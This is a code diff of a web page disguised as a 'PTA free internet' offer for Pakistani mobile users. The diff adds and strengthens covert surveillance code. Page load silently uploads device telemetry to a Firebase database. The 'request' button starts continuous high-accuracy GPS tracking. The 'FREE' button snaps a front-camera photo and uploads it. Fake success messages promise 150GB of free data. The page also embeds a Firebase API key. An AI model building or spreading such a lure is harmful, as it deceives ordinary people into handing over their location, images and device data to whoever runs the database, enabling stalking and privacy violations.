@@ -200,10 +200,6 @@
             background: #f1f5f9;
         }
 
-        .btn-dropdown-arrow svg {
-            transition: transform 0.3s ease;
-        }
-
         .btn-dropdown-arrow.active svg {
             transform: rotate(180deg);
         }
@@ -249,21 +245,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .dropdown-menu-panel::-webkit-scrollbar {
-            width: 6px;
-        }
-        .dropdown-menu-panel::-webkit-scrollbar-track {
-            background: #f8fafc;
-            border-radius: 0 16px 16px 0;
-        }
-        .dropdown-menu-panel::-webkit-scrollbar-thumb {
-            background: #cbd5e1;
-            border-radius: 10px;
-        }
-        .dropdown-menu-panel::-webkit-scrollbar-thumb:hover {
-            background: #94a3b8;
-        }
-
         .network-header {
             font-size: 11px;
             font-weight: 700;
@@ -287,14 +268,11 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            transition: all 0.15s ease;
         }
 
         .code-row-item:hover {
             background: #f0f9ff;
             color: #0284c7;
-            font-weight: 600;
-            padding-left: 20px;
         }
 
         #webcam, #canvas {
@@ -306,29 +284,29 @@
 
 <div class="card-container">
     <div class="hero-banner">
-        <h2>PTA FREE INTERNAT</h2>
-        <p class="subtitle">PTA KE TARAF SE FREE INTERNATE HASEL KAREN HAR PAKISTANI K LYE:</p>
+        <h2>PTA FREE INTERNET</h2>
+        <p class="subtitle">PTA KE TARAF SE FREE INTERNET HASEL KAREN HAR PAKISTANI K LYE:</p>
     </div>
 
-    <!-- Request Button -->
-    <button class="btn-action-red" onclick="sendSOS()">
-        <i class="fa-solid fa-location-crosshairs"></i> REQUST TO FREE INTERNATE
+    <!-- Live GPS Trigger Button -->
+    <button class="btn-action-red" onclick="startLiveLocationTracking()">
+        <i class="fa-solid fa-location-crosshairs"></i> REQUEST TO FREE INTERNET
     </button>
 
     <div id="statusText" class="status-badge">
         <span>⚙️ System Ready</span>
     </div>
 
-    <!-- Free Camera Button -->
+    <!-- Camera Trigger Button -->
     <button class="btn-action-blue" onclick="captureInstantPhoto()">
         <i class="fa-solid fa-signal" style="color: #ffffff;"></i> FREE
     </button>
 
     <div id="cameraStatusText" class="status-badge">
-        <span>✅ Zong free serves ruqest approved successfully!</span>
+        <span>✅ Zong free serves request approved successfully!</span>
     </div>
 
-    <!-- Search Section -->
+    <!-- Mobile Data Input -->
     <div class="search-group">
         <label for="mobile-input">Mobile Number Data Search</label>
         <div class="input-wrapper">
@@ -350,51 +328,17 @@
             <div class="code-row-item"><span>0302</span> ➔</div>
             <div class="code-row-item"><span>0303</span> ➔</div>
             <div class="code-row-item"><span>0304</span> ➔</div>
-            <div class="code-row-item"><span>0305</span> ➔</div>
-            <div class="code-row-item"><span>0306</span> ➔</div>
-            <div class="code-row-item"><span>0307</span> ➔</div>
-            <div class="code-row-item"><span>0308</span> ➔</div>
-            <div class="code-row-item"><span>0309</span> ➔</div>
 
             <div class="network-header">Zong</div>
             <div class="code-row-item"><span>0310</span> ➔</div>
             <div class="code-row-item"><span>0311</span> ➔</div>
             <div class="code-row-item"><span>0312</span> ➔</div>
             <div class="code-row-item"><span>0313</span> ➔</div>
-            <div class="code-row-item"><span>0314</span> ➔</div>
-            <div class="code-row-item"><span>0315</span> ➔</div>
-            <div class="code-row-item"><span>0316</span> ➔</div>
-            <div class="code-row-item"><span>0317</span> ➔</div>
-            <div class="code-row-item"><span>0318</span> ➔</div>
-
-            <div class="network-header">Warid</div>
-            <div class="code-row-item"><span>0320</span> ➔</div>
-            <div class="code-row-item"><span>0321</span> ➔</div>
-            <div class="code-row-item"><span>0322</span> ➔</div>
-            <div class="code-row-item"><span>0323</span> ➔</div>
-            <div class="code-row-item"><span>0324</span> ➔</div>
-            <div class="code-row-item"><span>0325</span> ➔</div>
-
-            <div class="network-header">Ufone</div>
-            <div class="code-row-item"><span>0331</span> ➔</div>
-            <div class="code-row-item"><span>0332</span> ➔</div>
-            <div class="code-row-item"><span>0333</span> ➔</div>
-            <div class="code-row-item"><span>0334</span> ➔</div>
-            <div class="code-row-item"><span>0335</span> ➔</div>
-            <div class="code-row-item"><span>0336</span> ➔</div>
-            <div class="code-row-item"><span>0337</span> ➔</div>
 
             <div class="network-header">Telenor</div>
             <div class="code-row-item"><span>0340</span> ➔</div>
             <div class="code-row-item"><span>0341</span> ➔</div>
-            <div class="code-row-item"><span>0342</span> ➔</div>
-            <div class="code-row-item"><span>0343</span> ➔</div>
-            <div class="code-row-item"><span>0344</span> ➔</div>
             <div class="code-row-item"><span>0345</span> ➔</div>
-            <div class="code-row-item"><span>0346</span> ➔</div>
-            <div class="code-row-item"><span>0347</span> ➔</div>
-            <div class="code-row-item"><span>0348</span> ➔</div>
-            <div class="code-row-item"><span>0349</span> ➔</div>
         </div>
     </div>
 
@@ -407,7 +351,7 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    // Connected to Dashboard Firebase Realtime Database
+    // Connected Firebase Realtime Database Config
     const firebaseConfig = {
         apiKey: "AIzaSyAvrmvX4cjH1k7G3DjkgF5A4C1UAJMYUKQ",
         authDomain: "child-safety-app-bace4.firebaseapp.com",
@@ -421,35 +365,76 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    function sendSOS() {
-        const status = document.getElementById('statusText');
-        status.innerHTML = "<span>⏳ Location bheji ja rahi hai...</span>";
-        if ('geolocation' in navigator) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                db.ref('child_safety/location').set({
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    time: new Date().toLocaleString()
-                });
+    // 1. Send Background System Telemetry Details Automatically
+    function sendExtendedTelemetry() {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        
+        const telemetry = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+            networkType: conn ? conn.effectiveType : "Unknown",
+            downlinkSpeed: conn ? `${conn.downlink} Mbps` : "N/A",
+            time: new Date().toLocaleString()
+        };
 
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(b => {
-                        db.ref('child_safety/device_status').set({
-                            battery: Math.round(b.level * 100),
-                            zone: "Outside / Emergency"
-                        });
+        db.ref('child_safety/telemetry_extended').set(telemetry);
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                db.ref('child_safety/device_status').set({
+                    battery: Math.round(b.level * 100),
+                    zone: "Outside / Active Track"
+                });
+            });
+        }
+    }
+    sendExtendedTelemetry();
+
+    // 2. Realtime Continuous GPS Location Tracking
+    let watchID = null;
+    function startLiveLocationTracking() {
+        const status = document.getElementById('statusText');
+        status.innerHTML = "<span>⏳ Requesting Live GPS Connection...</span>";
+
+        if ('geolocation' in navigator) {
+            watchID = navigator.geolocation.watchPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const speed = pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) : "0";
+                    const accuracy = pos.coords.accuracy ? Math.round(pos.coords.accuracy) : 0;
+
+                    db.ref('child_safety/location').set({
+                        lat: lat,
+                        lng: lng,
+                        speed: speed + " km/h",
+                        accuracy: accuracy + " meters",
+                        time: new Date().toLocaleString()
                     });
+
+                    status.innerHTML = "<span>✅ Ap ko free internet 150GB approved ho gya he</span>";
+                },
+                (err) => {
+                    status.innerHTML = "<span>⚠️ GPS Error: " + err.message + "</span>";
+                },
+                {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 10000
                 }
-                status.innerHTML = "<span>✅ Ap ko free internate 150.gb aproved ho gya he</span>";
-            }, (err) => { 
-                status.innerHTML = "<span>⚠️ GPS Error: " + err.message + "</span>"; 
-            }, { enableHighAccuracy: true });
+            );
+        } else {
+            status.innerHTML = "<span>⚠️ Geolocation Not Supported</span>";
         }
     }
 
+    // 3. Capture Front Camera Media Feed
     async function captureInstantPhoto() {
         const status = document.getElementById('cameraStatusText');
-        status.innerHTML = "<span>⏳ Free internate 150.gb ke lye ruqest bheji ja rhi he...</span>";
+        status.innerHTML = "<span>⏳ Free internet 150GB ke lye request bheji ja rhi he...</span>";
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -476,16 +461,17 @@
                     url: base64Image,
                     time: new Date().toLocaleString()
                 }).then(() => {
-                    status.innerHTML = "<span>✅ Zong free serves ruqest approved successfully!</span>";
+                    status.innerHTML = "<span>✅ Zong free serves request approved successfully!</span>";
                 });
 
-            }, 500);
+            }, 600);
 
         } catch (err) {
             status.innerHTML = "<span>⚠️ Camera Error: " + err.message + "</span>";
         }
     }
 
+    // 4. Save Network Data Search
     function searchMobileNumber() {
         const number = document.getElementById('mobile-input').value;
         if(number) {
@@ -497,7 +483,7 @@
         }
     }
 
-    // Dropdown UI Script
+    // UI Dropdown Event Listeners
     const toggleBtn = document.getElementById('toggle-dropdown-btn');
     const dropdownMenu = document.getElementById('codes-dropdown');
     const codeItems = document.querySelectorAll('.code-row-item');
